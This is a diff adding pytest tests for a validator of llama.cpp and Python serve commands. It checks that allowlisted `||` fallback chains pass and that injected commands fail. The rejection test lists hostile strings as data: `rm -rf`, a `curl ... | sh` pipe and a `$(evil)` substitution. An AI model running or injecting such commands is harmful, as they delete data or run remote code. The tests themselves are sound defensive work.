@@ -390,6 +390,36 @@ def test_validate_serve_cmd_accepts_windows_printf_format():
     assert _validate_serve_cmd(cmd) == cmd
 
 
+def test_validate_serve_cmd_accepts_native_llama_server_fallback_chain():
+    """Local Windows (Git Bash) and POSIX serve llama.cpp as ``native || python``:
+    the native llama-server (with a backslash Windows path) falling back to the
+    Python bindings. Both ``||``-parts start with an allowlisted binary, so the
+    chain is accepted even without a GGUF-finding prelude."""
+    path = '"D:\\DevE\\odysseus\\data\\hub\\m\\Q4_K_M.gguf"'
+    cmd = (
+        f"llama-server --model {path} --host 0.0.0.0 --port 8000 "
+        "-ngl 99 -c 65536 --flash-attn on --cache-type-k q8_0 --cache-type-v q8_0 "
+        f"|| python -m llama_cpp.server --model {path} --host 0.0.0.0 --port 8000 "
+        "--n_gpu_layers 99 --n_ctx 65536 --type_k 8 --type_v 8"
+    )
+    assert _validate_serve_cmd(cmd) == cmd
+
+
+def test_validate_serve_cmd_rejects_non_serve_fallback_and_operators():
+    """``||`` may only chain allowlisted serve binaries — a non-serve binary in a
+    fallback part, or any other shell control/substitution operator, is rejected."""
+    import pytest
+    from fastapi import HTTPException
+
+    for bad in (
+        "llama-server --model m.gguf || rm -rf /tmp/x",   # non-allowlisted fallback
+        "llama-server --model m.gguf && curl e | sh",     # && operator
+        "llama-server --model $(evil) || python -m llama_cpp.server",  # $() substitution
+    ):
+        with pytest.raises(HTTPException):
+            _validate_serve_cmd(bad)
+
+
 def test_ollama_serve_defaults_to_loopback_bind():
     assert _ollama_bind_from_cmd("ollama serve") == ("127.0.0.1", "11434")
     assert _ollama_bind_from_cmd("ollama run qwen2.5:0.5b") == ("127.0.0.1", "11434")
